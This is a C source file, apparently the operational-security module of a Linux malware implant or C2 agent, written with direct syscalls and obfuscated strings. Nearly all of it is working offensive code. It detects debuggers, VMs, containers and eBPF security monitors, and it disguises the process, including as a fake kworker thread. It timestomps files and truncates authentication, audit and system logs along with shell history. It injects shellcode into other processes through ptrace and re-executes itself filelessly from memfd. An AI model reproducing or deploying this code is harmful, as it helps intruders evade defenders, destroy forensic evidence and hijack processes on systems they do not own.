/// opsec.c -- OPSEC checks + offensive capabilities for Linux agent
/// Anti-debug, VM/hypervisor detection, container detection, eBPF detection,
/// process masquerading, timestomping, log evasion, ptrace injection, memfd migrate
/// Uses only direct syscalls — zero libc dependency.

#include "opsec.h"
#include "crt.h"
#include "types.h"
#include "strings_obf.h"

#ifdef ARCH_X86_64
#include "syscalls_x64.h"
#endif
#ifdef ARCH_AARCH64
#include "syscalls_aarch64.h"
#endif

#define O_RDONLY    0
#define O_WRONLY    1
#define O_RDWR     2
#define O_CREAT    0100
#define O_TRUNC    01000

#define PTRACE_TRACEME  0
#define PTRACE_PEEKTEXT 1
#define PTRACE_POKETEXT 4
#define PTRACE_GETREGS  12
#define PTRACE_SETREGS  13
#define PTRACE_ATTACH   16
#define PTRACE_DETACH   17

#define PR_SET_NAME  15

#define MFD_CLOEXEC  0x0001U

#ifndef AT_FDCWD
#define AT_FDCWD     -100
#endif

// BPF commands
#define BPF_PROG_GET_NEXT_ID   11
#define BPF_PROG_GET_FD_BY_ID  13
#define BPF_OBJ_GET_INFO_BY_FD 15

// BPF program types (monitoring-relevant)
#define BPF_PROG_TYPE_KPROBE        1
#define BPF_PROG_TYPE_TRACEPOINT    5
#define BPF_PROG_TYPE_RAW_TRACEPOINT 17
#define BPF_PROG_TYPE_LSM           29

// ── Helpers ──

/// Read a small file via direct syscall. Returns bytes read, -1 on error.
static int read_file(const char *path, char *buf, int max_len) {
    int fd = sys_open(path, O_RDONLY, 0);
    if (fd < 0) return -1;

    int total = 0;
    while (total < max_len - 1) {
        long n = sys_read(fd, buf + total, (size_t)(max_len - 1 - total));
        if (n <= 0) break;
        total += (int)n;
    }
    buf[total] = '\0';
    sys_close(fd);
    return total;
}

/// Check if a file exists (can be opened)
static int file_exists(const char *path) {
    int fd = sys_open(path, O_RDONLY, 0);
    if (fd < 0) return 0;
    sys_close(fd);
    return 1;
}

/// Case-insensitive substring search in buf
static int contains_ci(const char *haystack, const char *needle) {
    if (!*needle) return 1;
    int nlen = (int)ax_strlen(needle);

    for (; *haystack; haystack++) {
        int match = 1;
        for (int i = 0; i < nlen; i++) {
            char h = haystack[i];
            char n = needle[i];
            if (!h) { match = 0; break; }
            if (h >= 'A' && h <= 'Z') h += 32;
            if (n >= 'A' && n <= 'Z') n += 32;
            if (h != n) { match = 0; break; }
        }
        if (match) return 1;
    }
    return 0;
}

/// Write all bytes to fd
static int write_all(int fd, const void *buf, size_t len) {
    const uint8_t *p = (const uint8_t *)buf;
    size_t remaining = len;
    while (remaining > 0) {
        long n = sys_write(fd, p, remaining);
        if (n < 0) return -1;
        p += n;
        remaining -= (size_t)n;
    }
    return 0;
}

// ══════════════════════════════════════════════════════════════════════
// Anti-Debug
// ══════════════════════════════════════════════════════════════════════

int opsec_anti_debug(void) {
    // 1. Check /proc/self/status for TracerPid (non-invasive)
    char _path_status[64];
    DEOBF(OBF_PROC_SELF_STATUS, _path_status);
    char status_buf[2048];
    if (read_file(_path_status, status_buf, sizeof(status_buf)) > 0) {
        char *tracer = ax_strstr(status_buf, "TracerPid:");
        if (tracer) {
            tracer += 10;
            while (*tracer == ' ' || *tracer == '\t') tracer++;
            int pid = ax_atoi(tracer);
            if (pid != 0) {
                ZERO_STR(_path_status, sizeof(_path_status));
                return -1;  // Non-zero TracerPid → debugger attached
            }
        }
    }
    ZERO_STR(_path_status, sizeof(_path_status));

    // 2. Fork-based ptrace check — child attempts TRACEME, parent reads result
    //    This avoids leaving the main process in a traced state.
    {
        int pipefd[2];
        if (sys_pipe2(pipefd, 0) < 0) goto skip_ptrace;

        int child = sys_fork();
        if (child < 0) {
            sys_close(pipefd[0]);
            sys_close(pipefd[1]);
            goto skip_ptrace;
        }

        if (child == 0) {
            // Child: try TRACEME — if we're being traced, this fails
            sys_close(pipefd[0]);
            uint8_t result = 0;
            if (sys_ptrace(PTRACE_TRACEME, 0, NULL, NULL) < 0)
                result = 1;  // Already traced
            sys_write(pipefd[1], &result, 1);
            sys_close(pipefd[1]);
            sys_exit_group(0);
        }

        // Parent: read child result
        sys_close(pipefd[1]);
        uint8_t result = 0;
        sys_read(pipefd[0], &result, 1);
        sys_close(pipefd[0]);

        // Wait for child to prevent zombie
        sys_wait4(child, NULL, 0, NULL);

        if (result != 0) return -1;
    }
skip_ptrace:

    // 3. Timing check — detect single-stepping
#ifdef ARCH_X86_64
    {
        uint32_t lo1, hi1, lo2, hi2;
        __asm__ volatile("rdtsc" : "=a"(lo1), "=d"(hi1));

        volatile int dummy = 0;
        for (int i = 0; i < 100; i++) dummy += i;
        (void)dummy;

        __asm__ volatile("rdtsc" : "=a"(lo2), "=d"(hi2));

        uint64_t t1 = ((uint64_t)hi1 << 32) | lo1;
        uint64_t t2 = ((uint64_t)hi2 << 32) | lo2;
        uint64_t delta = t2 - t1;

        // Normal: ~1000-50000 cycles. Single-step: >10M cycles.
        if (delta > 10000000) {
            return -1;
        }
    }
#endif

    return 0;
}

// ══════════════════════════════════════════════════════════════════════
// VM/Hypervisor Detection
// ══════════════════════════════════════════════════════════════════════

int opsec_vm_detect(void) {
    char dmi_buf[256];

    // 1. DMI product_name
    char _path_dmi[64];
    DEOBF(OBF_SYS_DMI_PRODUCT, _path_dmi);
    if (read_file(_path_dmi, dmi_buf, sizeof(dmi_buf)) > 0) {
        if (contains_ci(dmi_buf, "virtualbox")) return -1;
        if (contains_ci(dmi_buf, "vmware"))     return -1;
        if (contains_ci(dmi_buf, "qemu"))       return -1;
        if (contains_ci(dmi_buf, "kvm"))        return -1;
        if (contains_ci(dmi_buf, "xen"))        return -1;
        if (contains_ci(dmi_buf, "hyper-v"))    return -1;
        if (contains_ci(dmi_buf, "parallels"))  return -1;
    }

    // 2. DMI sys_vendor
    char _path_vendor[64];
    DEOBF(OBF_SYS_DMI_VENDOR, _path_vendor);
    if (read_file(_path_vendor, dmi_buf, sizeof(dmi_buf)) > 0) {
        if (contains_ci(dmi_buf, "vmware"))     return -1;
        if (contains_ci(dmi_buf, "innotek"))    return -1;
        if (contains_ci(dmi_buf, "qemu"))       return -1;
        if (contains_ci(dmi_buf, "xen"))        return -1;
        if (contains_ci(dmi_buf, "microsoft"))  return -1;
        if (contains_ci(dmi_buf, "parallels"))  return -1;
    }

    // 3. /proc/cpuinfo — check for "hypervisor" flag
    char _path_cpu[64];
    DEOBF(OBF_PROC_CPUINFO, _path_cpu);
    char cpuinfo_buf[4096];
    if (read_file(_path_cpu, cpuinfo_buf, sizeof(cpuinfo_buf)) > 0) {
        if (ax_strstr(cpuinfo_buf, "hypervisor")) return -1;
    }

    // 4. CPU count check — analysis VMs often have 1 core
    {
        int cpu_count = 0;
        char *p = cpuinfo_buf;
        while ((p = ax_strstr(p, "processor")) != NULL) {
            cpu_count++;
            p += 9;
        }
        if (cpu_count > 0 && cpu_count < 2) return -1;
    }

    // 5. RAM check — /proc/meminfo MemTotal < 2GB = suspect
    {
        char _path_mem[64];
        DEOBF(OBF_PROC_MEMINFO, _path_mem);
        char meminfo_buf[1024];
        if (read_file(_path_mem, meminfo_buf, sizeof(meminfo_buf)) > 0) {
            char *mt = ax_strstr(meminfo_buf, "MemTotal:");
            if (mt) {
                mt += 9;
                while (*mt == ' ') mt++;
                long kb = 0;
                while (*mt >= '0' && *mt <= '9') {
                    kb = kb * 10 + (*mt - '0');
                    mt++;
                }
                if (kb > 0 && kb < 2 * 1024 * 1024) return -1;
            }
        }
    }

    return 0;
}

// ══════════════════════════════════════════════════════════════════════
// Container Detection
// ══════════════════════════════════════════════════════════════════════

int opsec_container_detect(void) {
    char _path_dockerenv[64];
    DEOBF(OBF_DOCKERENV, _path_dockerenv);
    if (file_exists(_path_dockerenv)) return -1;

    char _path_cgroup[64];
    DEOBF(OBF_PROC_1_CGROUP, _path_cgroup);
    char cgroup_buf[2048];
    if (read_file(_path_cgroup, cgroup_buf, sizeof(cgroup_buf)) > 0) {
        if (ax_strstr(cgroup_buf, "docker"))     return -1;
        if (ax_strstr(cgroup_buf, "kubepods"))   return -1;
        if (ax_strstr(cgroup_buf, "lxc"))        return -1;
        if (ax_strstr(cgroup_buf, "containerd")) return -1;
        if (ax_strstr(cgroup_buf, "podman"))     return -1;
    }

    char selfcg_buf[1024];
    if (read_file("/proc/self/cgroup", selfcg_buf, sizeof(selfcg_buf)) > 0) {
        if (ax_strstr(selfcg_buf, "docker"))   return -1;
        if (ax_strstr(selfcg_buf, "kubepods")) return -1;
        if (ax_strstr(selfcg_buf, "podman"))   return -1;
    }

    char _path_k8s[64];
    DEOBF(OBF_K8S_SECRETS, _path_k8s);
    if (file_exists(_path_k8s)) return -1;
    if (file_exists("/var/run/secrets/kubernetes.io/serviceaccount/token")) return -1;

    return 0;
}

// ══════════════════════════════════════════════════════════════════════
// eBPF Detection — enumerate loaded BPF programs
// ══════════════════════════════════════════════════════════════════════

int opsec_ebpf_detect(void) {
    int monitoring_count = 0;

    // Method 1: Check /sys/fs/bpf/ — pinned BPF programs
    if (file_exists("/sys/fs/bpf")) {
        // If the directory exists and is accessible, BPF is active
        // We can't easily enumerate without getdents, so just flag it
    }

    // Method 2: bpf(BPF_PROG_GET_NEXT_ID) — iterate all loaded programs
    // attr = { start_id: u32, next_id: u32 }
    // Each iteration returns next program ID
    {
        // BPF attr union — we only need the first 8 bytes
        uint8_t attr[128];
        ax_memset(attr, 0, sizeof(attr));

        uint32_t start_id = 0;
        for (int iter = 0; iter < 1024; iter++) {
            // attr.__u32 start_id at offset 0
            ax_memcpy(attr, &start_id, 4);

            long ret = sys_bpf(BPF_PROG_GET_NEXT_ID, attr, sizeof(attr));
            if (ret < 0) break;  // No more programs

            // next_id at offset 4
            uint32_t next_id;
            ax_memcpy(&next_id, attr + 4, 4);

            // Get fd for this program
            ax_memset(attr, 0, sizeof(attr));
            ax_memcpy(attr, &next_id, 4);  // prog_id at offset 0
            long fd = sys_bpf(BPF_PROG_GET_FD_BY_ID, attr, sizeof(attr));
            if (fd >= 0) {
                // Get program info via BPF_OBJ_GET_INFO_BY_FD
                // info_by_fd: { bpf_fd: u32, info_len: u32, info: u64 (ptr) }
                uint8_t info[256];
                ax_memset(info, 0, sizeof(info));
                ax_memset(attr, 0, sizeof(attr));

                uint32_t bpf_fd = (uint32_t)fd;
                uint32_t info_len = (uint32_t)sizeof(info);
                uint64_t info_ptr = (uint64_t)(unsigned long)info;

                // bpf_attr for OBJ_GET_INFO_BY_FD:
                // offset 0: bpf_fd (u32)
                // offset 4: info_len (u32)
                // offset 8: info (u64, pointer)
                ax_memcpy(attr, &bpf_fd, 4);
                ax_memcpy(attr + 4, &info_len, 4);
                ax_memcpy(attr + 8, &info_ptr, 8);

                ret = sys_bpf(BPF_OBJ_GET_INFO_BY_FD, attr, 16);
                if (ret == 0) {
                    // bpf_prog_info.type is at offset 0 (u32)
                    uint32_t prog_type;
                    ax_memcpy(&prog_type, info, 4);

                    if (prog_type == BPF_PROG_TYPE_KPROBE ||
                        prog_type == BPF_PROG_TYPE_TRACEPOINT ||
                        prog_type == BPF_PROG_TYPE_RAW_TRACEPOINT ||
                        prog_type == BPF_PROG_TYPE_LSM) {
                        monitoring_count++;
                    }
                }
                sys_close((int)fd);
            }

            start_id = next_id;
        }
    }

    // Method 3: Filesystem indicators
    // Check for Falco / Tetragon / Cilium / Tracee
    if (file_exists("/etc/falco/falco.yaml"))           monitoring_count++;
    if (file_exists("/var/run/cilium/state"))            monitoring_count++;
    if (file_exists("/opt/tetragon"))                    monitoring_count++;

    return monitoring_count;  // 0 = safe, >0 = number of eBPF monitors found
}

// ══════════════════════════════════════════════════════════════════════
// Process Masquerading
// ══════════════════════════════════════════════════════════════════════

void opsec_masquerade(const char *fake_name, char **argv) {
    if (!fake_name || !*fake_name) return;

    // 1. prctl(PR_SET_NAME) → modifies /proc/self/comm (max 16 chars)
    sys_prctl(PR_SET_NAME, (unsigned long)fake_name, 0, 0, 0);

    // 2. Overwrite argv[0] → modifies /proc/self/cmdline
    if (argv && argv[0]) {
        // Calculate max length we can overwrite (argv[0] buffer)
        size_t old_len = ax_strlen(argv[0]);
        size_t new_len = ax_strlen(fake_name);
        size_t copy_len = new_len < old_len ? new_len : old_len;

        ax_memcpy(argv[0], fake_name, copy_len);
        // Zero-fill remainder to avoid partial old name showing
        if (copy_len < old_len) {
            ax_memset(argv[0] + copy_len, 0, old_len - copy_len);
        }
    }
}

// ══════════════════════════════════════════════════════════════════════
// Timestomping — modify atime/mtime via utimensat
// ══════════════════════════════════════════════════════════════════════

int opsec_timestomp(const char *path, long ts_sec) {
    if (!path) return -1;

    struct linux_timespec times[2];

    if (ts_sec == 0) {
        // Special: set UTIME_OMIT-like behavior — copy from reference
        // Use a common system file as reference
        struct linux_stat st;
        if (sys_stat("/usr/bin/ls", &st) == 0) {
            times[0].tv_sec = (long)st.st_atime_sec;
            times[0].tv_nsec = (long)st.st_atime_nsec;
            times[1].tv_sec = (long)st.st_mtime_sec;
            times[1].tv_nsec = (long)st.st_mtime_nsec;
        } else {
            // Fallback: Jan 15, 2024 10:30:00 UTC
            times[0].tv_sec = 1705311000;
            times[0].tv_nsec = 0;
            times[1].tv_sec = 1705311000;
            times[1].tv_nsec = 0;
        }
    } else {
        times[0].tv_sec = ts_sec;
        times[0].tv_nsec = 0;
        times[1].tv_sec = ts_sec;
        times[1].tv_nsec = 0;
    }

    return sys_utimensat(AT_FDCWD, path, times, 0);
}

// ══════════════════════════════════════════════════════════════════════
// Log Evasion — truncate authentication & session logs
// ══════════════════════════════════════════════════════════════════════

int opsec_clean_logs(void) {
    // Only effective as root — non-root will fail silently
    int cleaned = 0;

    // Truncate binary logs (these can't be selectively edited)
    const char *binary_logs[] = {
        "/var/log/wtmp",
        "/var/log/btmp",
        "/var/log/lastlog",
        "/var/run/utmp",
        NULL
    };

    for (int i = 0; binary_logs[i]; i++) {
        int fd = sys_open(binary_logs[i], O_WRONLY | O_TRUNC, 0);
        if (fd >= 0) {
            sys_close(fd);
            cleaned++;
        }
    }

    // Truncate text logs
    const char *text_logs[] = {
        "/var/log/auth.log",
        "/var/log/secure",
        "/var/log/syslog",
        "/var/log/messages",
        "/var/log/audit/audit.log",
        NULL
    };

    for (int i = 0; text_logs[i]; i++) {
        int fd = sys_open(text_logs[i], O_WRONLY | O_TRUNC, 0);
        if (fd >= 0) {
            sys_close(fd);
            cleaned++;
        }
    }

    // Clear shell history for current user
    // Read HOME from /proc/self/environ
    char _path_environ[64];
    DEOBF(OBF_PROC_SELF_ENVIRON, _path_environ);
    char env_buf[4096];
    int env_len = read_file(_path_environ, env_buf, sizeof(env_buf));
    if (env_len > 0) {
        // /proc/self/environ is NUL-separated
        char *p = env_buf;
        char *end = env_buf + env_len;
        while (p < end) {
            if (ax_strncmp(p, "HOME=", 5) == 0) {
                char *home = p + 5;
                // Truncate common history files
                char path[512];
                const char *history_files[] = {
                    "/.bash_history",
                    "/.zsh_history",
                    "/.python_history",
                    NULL
                };
                for (int i = 0; history_files[i]; i++) {
                    // Build path: HOME + history_file
                    size_t hlen = ax_strlen(home);
                    size_t flen = ax_strlen(history_files[i]);
                    if (hlen + flen < sizeof(path)) {
                        ax_memcpy(path, home, hlen);
                        ax_memcpy(path + hlen, history_files[i], flen + 1);
                        int fd = sys_open(path, O_WRONLY | O_TRUNC, 0);
                        if (fd >= 0) {
                            sys_close(fd);
                            cleaned++;
                        }
                    }
                }
                break;
            }
            // Skip to next NUL-separated entry
            while (p < end && *p) p++;
            p++;
        }
    }

    return cleaned;  // Number of logs truncated
}

// ══════════════════════════════════════════════════════════════════════
// Process Injection via ptrace
// ══════════════════════════════════════════════════════════════════════

#ifdef ARCH_X86_64

// x86_64 user_regs_struct (simplified)
struct user_regs {
    uint64_t r15, r14, r13, r12, rbp, rbx, r11, r10;
    uint64_t r9, r8, rax, rcx, rdx, rsi, rdi, orig_rax;
    uint64_t rip, cs, eflags, rsp, ss, fs_base, gs_base;
    uint64_t ds, es, fs, gs;
};

int opsec_inject_ptrace(int target_pid, const uint8_t *shellcode, size_t sc_len) {
    if (!shellcode || sc_len == 0) return -1;

    // 1. Attach to target
    if (sys_ptrace(PTRACE_ATTACH, target_pid, NULL, NULL) < 0)
        return -1;

    // Wait for target to stop
    int wstatus = 0;
    sys_wait4(target_pid, &wstatus, 0, NULL);

    // 2. Get current registers
    struct user_regs regs;
    if (sys_ptrace(PTRACE_GETREGS, target_pid, NULL, &regs) < 0) {
        sys_ptrace(PTRACE_DETACH, target_pid, NULL, NULL);
        return -1;
    }

    // 3. Find writable region in target via /proc/PID/maps
    // Look for an anonymous RW mapping (e.g. heap or stack) to write shellcode
    char maps_path[64];
    char pid_str[16];
    ax_itoa(target_pid, pid_str, 10);
    ax_strcpy(maps_path, "/proc/");
    ax_strcat(maps_path, pid_str);
    ax_strcat(maps_path, "/maps");

    char maps_buf[8192];
    int maps_len = read_file(maps_path, maps_buf, sizeof(maps_buf));
    if (maps_len <= 0) {
        sys_ptrace(PTRACE_DETACH, target_pid, NULL, NULL);
        return -1;
    }

    // Parse maps looking for an executable region to inject into.
    // Priority: 1) r-xp (code section — POKETEXT bypasses page protections)
    //           2) rwxp (rare but ideal)
    //           3) fallback to current RIP
    // Writing into r-xp via POKETEXT works because ptrace operates at
    // the kernel level, bypassing page permission checks. The page is
    // already executable so the target can run the shellcode directly.
    uint64_t inject_addr = 0;
    char *line = maps_buf;
    while (*line) {
        // Format: "addr1-addr2 perms offset dev inode pathname"
        uint64_t addr1 = 0, addr2 = 0;
        char *p = line;
        while (*p && *p != '-') {
            char c = *p;
            if (c >= '0' && c <= '9') addr1 = (addr1 << 4) | (uint64_t)(c - '0');
            else if (c >= 'a' && c <= 'f') addr1 = (addr1 << 4) | (uint64_t)(c - 'a' + 10);
            p++;
        }
        if (*p == '-') p++;
        while (*p && *p != ' ') {
            char c = *p;
            if (c >= '0' && c <= '9') addr2 = (addr2 << 4) | (uint64_t)(c - '0');
            else if (c >= 'a' && c <= 'f') addr2 = (addr2 << 4) | (uint64_t)(c - 'a' + 10);
            p++;
        }
        if (*p == ' ') p++;
        // Read perms (4 chars: r-xp, rwxp, rw-p, etc.)
        if (p[0] == 'r' && p[2] == 'x' && p[3] == 'p') {
            // r-xp or rwxp — executable region
            uint64_t region_size = addr2 - addr1;
            if (region_size > sc_len + 0x200) {
                // Inject near the end of .text to minimize disruption
                inject_addr = addr2 - sc_len - 0x100;
                // Align to 16
                inject_addr &= ~(uint64_t)0xF;
                break;
            }
        }
        // Next line
        while (*line && *line != '\n') line++;
        if (*line == '\n') line++;
    }

    if (inject_addr == 0) {
        // Fallback: use RIP-relative (inject at current RIP position)
        inject_addr = regs.rip;
    }

    // 4. Write shellcode via POKETEXT (8 bytes at a time)
    for (size_t i = 0; i < sc_len; i += 8) {
        uint64_t word = 0;
        size_t chunk = sc_len - i;
        if (chunk > 8) chunk = 8;

        // If less than 8 bytes, read existing word first to preserve trailing bytes
        if (chunk < 8) {
            long existing = sys_ptrace(PTRACE_PEEKTEXT, target_pid,
                                       (void *)(inject_addr + i), NULL);
            word = (uint64_t)existing;
        }

        ax_memcpy(&word, shellcode + i, chunk);
        if (sys_ptrace(PTRACE_POKETEXT, target_pid,
                       (void *)(inject_addr + i), (void *)word) < 0) {
            sys_ptrace(PTRACE_DETACH, target_pid, NULL, NULL);
            return -1;
        }
    }

    // 5. Set RIP to our shellcode
    regs.rip = inject_addr;
    sys_ptrace(PTRACE_SETREGS, target_pid, NULL, &regs);

    // 6. Detach — target resumes at our shellcode
    sys_ptrace(PTRACE_DETACH, target_pid, NULL, NULL);

    return 0;
}

#elif defined(ARCH_AARCH64)

// ARM64 user_regs_struct
struct user_regs {
    uint64_t regs[31];  // x0-x30
    uint64_t sp;
    uint64_t pc;
    uint64_t pstate;
};

// ARM64 uses PTRACE_GETREGSET / PTRACE_SETREGSET with NT_PRSTATUS
// But some kernels support GETREGS/SETREGS too. Use raw ptrace.
#define PTRACE_GETREGSET 0x4204
#define PTRACE_SETREGSET 0x4205
#define NT_PRSTATUS      1

struct iovec_t {
    void   *iov_base;
    size_t  iov_len;
};

int opsec_inject_ptrace(int target_pid, const uint8_t *shellcode, size_t sc_len) {
    if (!shellcode || sc_len == 0) return -1;

    // 1. Attach
    if (sys_ptrace(PTRACE_ATTACH, target_pid, NULL, NULL) < 0)
        return -1;

    int wstatus = 0;
    sys_wait4(target_pid, &wstatus, 0, NULL);

    // 2. Get registers via GETREGSET
    struct user_regs regs;
    struct iovec_t iov;
    iov.iov_base = &regs;
    iov.iov_len = sizeof(regs);

    if (sys_ptrace(PTRACE_GETREGSET, target_pid, (void *)(long)NT_PRSTATUS, &iov) < 0) {
        sys_ptrace(PTRACE_DETACH, target_pid, NULL, NULL);
        return -1;
    }

    // 3. Find writable region
    char maps_path[64];
    char pid_str[16];
    ax_itoa(target_pid, pid_str, 10);
    ax_strcpy(maps_path, "/proc/");
    ax_strcat(maps_path, pid_str);
    ax_strcat(maps_path, "/maps");

    char maps_buf[8192];
    int maps_len = read_file(maps_path, maps_buf, sizeof(maps_buf));
    uint64_t inject_addr = 0;

    if (maps_len > 0) {
        // Find r-xp or rwxp region (executable) — POKETEXT bypasses page protections
        char *line = maps_buf;
        while (*line) {
            uint64_t addr1 = 0, addr2 = 0;
            char *p = line;
            while (*p && *p != '-') {
                char c = *p;
                if (c >= '0' && c <= '9') addr1 = (addr1 << 4) | (uint64_t)(c - '0');
                else if (c >= 'a' && c <= 'f') addr1 = (addr1 << 4) | (uint64_t)(c - 'a' + 10);
                p++;
            }
            if (*p == '-') p++;
            while (*p && *p != ' ') {
                char c = *p;
                if (c >= '0' && c <= '9') addr2 = (addr2 << 4) | (uint64_t)(c - '0');
                else if (c >= 'a' && c <= 'f') addr2 = (addr2 << 4) | (uint64_t)(c - 'a' + 10);
                p++;
            }
            if (*p == ' ') p++;
            if (p[0] == 'r' && p[2] == 'x' && p[3] == 'p') {
                uint64_t region_size = addr2 - addr1;
                if (region_size > sc_len + 0x200) {
                    inject_addr = addr2 - sc_len - 0x100;
                    inject_addr &= ~(uint64_t)0xF;
                    break;
                }
            }
            while (*line && *line != '\n') line++;
            if (*line == '\n') line++;
        }
    }

    if (inject_addr == 0) {
        inject_addr = regs.pc;
    }

    // 4. Write shellcode via POKETEXT
    for (size_t i = 0; i < sc_len; i += 8) {
        uint64_t word = 0;
        size_t chunk = sc_len - i;
        if (chunk > 8) chunk = 8;

        if (chunk < 8) {
            long existing = sys_ptrace(PTRACE_PEEKTEXT, target_pid,
                                       (void *)(inject_addr + i), NULL);
            word = (uint64_t)existing;
        }

        ax_memcpy(&word, shellcode + i, chunk);
        if (sys_ptrace(PTRACE_POKETEXT, target_pid,
                       (void *)(inject_addr + i), (void *)word) < 0) {
            sys_ptrace(PTRACE_DETACH, target_pid, NULL, NULL);
            return -1;
        }
    }

    // 5. Set PC to our shellcode
    regs.pc = inject_addr;
    iov.iov_base = &regs;
    iov.iov_len = sizeof(regs);
    sys_ptrace(PTRACE_SETREGSET, target_pid, (void *)(long)NT_PRSTATUS, &iov);

    // 6. Detach
    sys_ptrace(PTRACE_DETACH, target_pid, NULL, NULL);

    return 0;
}

#endif // ARCH_X86_64 / ARCH_AARCH64

// ══════════════════════════════════════════════════════════════════════
// Fileless self-re-exec via memfd_create
// ══════════════════════════════════════════════════════════════════════

int opsec_migrate_memfd(char **argv, char **envp) {
    // 1. Read our own binary from /proc/self/exe
    char _path_exe[64];
    DEOBF(OBF_PROC_SELF_EXE, _path_exe);
    int src_fd = sys_open(_path_exe, O_RDONLY, 0);
    if (src_fd < 0) return -1;

    // Get size via stat
    struct linux_stat st;
    if (sys_fstat(src_fd, &st) < 0) {
        sys_close(src_fd);
        return -1;
    }

    size_t exe_size = (size_t)st.st_size;
    if (exe_size == 0 || exe_size > 100 * 1024 * 1024) {
        sys_close(src_fd);
        return -1;  // Sanity check: max 100MB
    }

    // 2. Create anonymous fd via memfd_create
    int mem_fd = sys_memfd_create("", MFD_CLOEXEC);
    if (mem_fd < 0) {
        sys_close(src_fd);
        return -1;
    }

    // 3. Copy binary to memfd
    uint8_t copy_buf[4096];
    size_t remaining = exe_size;
    while (remaining > 0) {
        size_t chunk = remaining > sizeof(copy_buf) ? sizeof(copy_buf) : remaining;
        long n = sys_read(src_fd, copy_buf, chunk);
        if (n <= 0) {
            sys_close(src_fd);
            sys_close(mem_fd);
            return -1;
        }
        if (write_all(mem_fd, copy_buf, (size_t)n) != 0) {
            sys_close(src_fd);
            sys_close(mem_fd);
            return -1;
        }
        remaining -= (size_t)n;
    }
    sys_close(src_fd);

    // 4. Build /proc/self/fd/N path for execve
    char fd_path[64];
    ax_strcpy(fd_path, "/proc/self/fd/");
    char fd_str[16];
    ax_itoa(mem_fd, fd_str, 10);
    ax_strcat(fd_path, fd_str);

    // 5. execve from memfd — replaces current process
    // If argv is NULL, use a minimal argv
    char *default_argv[] = { (char*)"[kworker/0:1-events]", NULL };
    char *default_envp[] = { NULL };

    sys_execve(fd_path,
               argv ? argv : default_argv,
               envp ? envp : default_envp);

    // If we get here, execve failed
    sys_close(mem_fd);
    return -1;
}

// ══════════════════════════════════════════════════════════════════════
// Combined Check
// ══════════════════════════════════════════════════════════════════════

int opsec_check(void) {
    // Anti-debug is blocking
    if (opsec_anti_debug() != 0) return -1;

    // VM detection is blocking
    if (opsec_vm_detect() != 0) return -1;

    // Container detection is informational — don't block
    // opsec_container_detect();

    // eBPF detection is informational — >5 monitors is suspicious but not blocking
    // int ebpf = opsec_ebpf_detect();
    // if (ebpf > 5) return -1;  // Uncomment for paranoid mode

    return 0;
}
